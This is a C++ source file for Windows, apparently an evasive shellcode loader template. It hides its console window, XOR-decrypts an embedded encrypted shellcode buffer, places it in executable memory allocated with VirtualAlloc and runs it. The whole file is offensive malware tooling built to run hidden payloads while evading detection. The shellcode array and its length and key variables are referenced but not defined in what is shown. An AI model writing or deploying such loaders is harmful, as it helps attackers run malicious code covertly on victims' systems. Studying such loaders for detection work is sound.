#include <windows.h>
#include <iostream>

int main() {
    // Hide the console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );
    
    // The variable where we will decrypt the shellcode to
    unsigned char shell_code[shellcode_length];

    for(int i = 0; i < shellcode_length; i++) {
        // XOR Decryption
        shell_code[i] = (char) enc_shellcode[i] ^ password[i % password_len];
    }

    // Allocate the memory for placing our shellcode into memory
    void* payload = VirtualAlloc (0, sizeof(shell_code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into memory
    memcpy(payload, shell_code, sizeof(shell_code));

    // Execute the shellcode
    (( void(*)() )payload)();

    return 0;
}
